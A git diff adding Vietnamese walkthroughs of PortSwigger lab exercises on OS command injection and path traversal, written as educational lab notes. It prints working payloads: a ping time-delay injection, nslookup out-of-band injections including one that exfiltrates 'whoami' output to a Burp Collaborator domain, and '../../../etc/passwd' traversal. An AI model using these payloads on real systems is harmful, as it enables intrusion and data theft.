@@ -10,23 +10,71 @@ grouped by difficulty level and topic.
 ### OS command injection
 [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
 
+Bài lab này đã gợi ý cho chúng ta thực hiện câu lệnh whoami để giải quyết bài lab này. Bây giờ chúng ta xem thử chúng ta sẽ sử dụng câu lệnh này để xử lí như thế nào nhé !
+
+Khi access bài lab thì chúng ta thấy xuất hiện 1 trang web bán hàng bình thường, gồm những sản phẩm thì mình click vào xem thử thì thấy có 1 btn khá đặc biệt là btn *Check stock* thì thấy sẽ trả về giá của sản phẩm, đây không phải là gọi shell sao ? Thời tới rồi dùng burp suite để check thử xem nhé!
+
+Đây rồi , *storeID=1* đây chính là lúc *whoami* tỏa sáng, thật ra là mình dùng câu lệnh nào cũng được nhưng dùng câu này vì sẽ có liên quán đế những lab sau!
+
+Và chúng ta đã có được username bằng OS injection! Vậy lí do tại sao chúng ta lại có thể khai thác như thế ?? Là bởi vì khi dev web đã gọi shell nhưng lại không dùng các phương pháp bảo vệ và ngăn chặn, điều đó tạo cơ hội cho chúng ta exploit 1 cách dễ dàng!
 
 [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+
+Bài lab đã gợi ý rằng để solve bài lab thì dùng độ trễ 10s điều đó có nghĩa là chúng ta sẽ gặp phải 1 bài có lỗ hỗng blind OS.
+
+Access thì chúng ta lại 1 trang web quen thuộc nên là chúng ta cũng làm việc tương tự thử xem thì thật là đáng buồn, btn *Check stock* đã không còn nữa nhưng thay vào đó option *submit feedback* đã xuất hiện, và chúng ta điền thử xem có gì. Sau khi điền xong thì thấy chỉ trả về 1 dòng !
+Đây chính là blind OS rồi dùng burp suite bắt nó thôi nào!
+
+Khi bắt xong rồi thì lại thấy hơi nhiều biến nên không biết là cái nào có thể cho mình exploit nên mình thử hết bằng cách thêm 1 vài ký tự đặc biệt ví dụ như là *;* để check thử! 
+
+Và mình đã tìm ra nó ở email và nó trả về lỗi sau: 
+
+Điều đó cho thấy các value khác đã được validate input bằng cách nào đó còn email thì không nên là chúng ta sẽ khai thác vào đây.
+
+Vậy mình có thể dùng lệnh ping+-c+10+127.0.0.1; để xem mình có thể khai thác được lỗ hỗng này hay không! Nếu như sau 10s mới trả về kết quả thì có nghĩa là chúng ta đã exploit thành công ! 
 
 
 [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
 
+Bài lab này cho chúng ta 2 gợi ý là chúng ta có thể ghi tại thư mục */var/www/images/* và chúng ta thực hiện lệnh *whoami* và chuyển hướng đầu ra của output. Hhmm nghe có vẻ hơi rõ ràng rồi đấy
+
+
+Access lab thì lại thấy 1 web cũ thì lỗi mòn cũ thôi ! Sau khi kiểm tra thì biến email vẫn là nơi để chúng ta khai thác. Nhưng theo gợi ý thì chúng ta sẽ khai thác theo cách đó là đưa input ghi vào 1 file ở 1 thư mục chúng ta biết như là */var/www/images/* chúng ta có thể dùng repeater để tiếp tục thử nhiều cách injection .
+
+Sau đó để kiểm tra xem chúng ta đã thành công chưa thì hãy tìm 1 request load ảnh để kiểm chứng như sau.
+
 
 [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+
+Bài này là kiểu tấn công OAST[] cần 1 DNS tới chính xác địa chỉ burpcollaborator.net. 
+Access lab và vẫn đi theo lối cũ điều đó có nghĩa là việc exploit của mình vẫn thế chỉ khác chỗ là lần này câu lệnh exploit lần này sẽ khác 
+&nsloockup+burpcollaborator.net& 
+
+Chúng ta vẫn sẽ dùng burp suite để bắt và repeater để thử xem.
+Sau khi thực hiện xong sẽ có thông báo solve trả về.
+
+
 
 
 [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
 
+Bài này mình đánh giá nó khó hơn 1 chút vì nó cần thêm 1 số kiến thức về chắc năng của Burp Collaborator cũng như OAST hoạt động như nào để có thể áp dụng vào bài lab này.
+
+Access bài lab ta có gợi ý rằng chúng ta phải lấy được tên người dùng bằng câu lệnh *whoami* và submit thì mới pass qua được bài lab này. Vậy nên chúng ta dùng câu lệnh nslookup  và DNS từ chức năng BurpCollaborator cung cấp cho. * ||nslookup+`whoami`.x53orfnw7ap32surjmqs0zfncei56u.burpcollaborator.net|| * trong đó *x53orfnw7ap32surjmqs0zfncei56u* chính là DNS mà Burp Collaborator cung cấp cho chúng ta. 
+
+Sau đó chúng ta pull now để lấy những gì đã trả về bên DNS của chúng ta và chúng ta có username như sau ..... Submit và solve.
 
 
 ### Directory traversal
 
 [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
+
+Lab cho ta gợi ý rằng sẽ khai thác thông qua hình ảnh vậy nên khả năng là chúng ta load ảnh và exploit thôi.
+
+Access lab thì thấy 1 trang web quen thuộc, chúng ta thử bắt 1 file load hình ảnh và thấy rằng hình ảnh được truy xuất bằng đường dẫn */image?filename* ,thử exploit bằng payload *../../../etc/passwd* 
+Và kết quả trả về file passwd . ĐIều đó cho thấy chúng ta đã exploit thành công lỗ hổng Path Traversal trên trang web này. Lí do là vì web không dùng bất kỳ phương pháp nào để bảo vệ input đầu vào nào cả mà chỉ trực tiếp truy xuất hình.
+
+
 
 [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
 
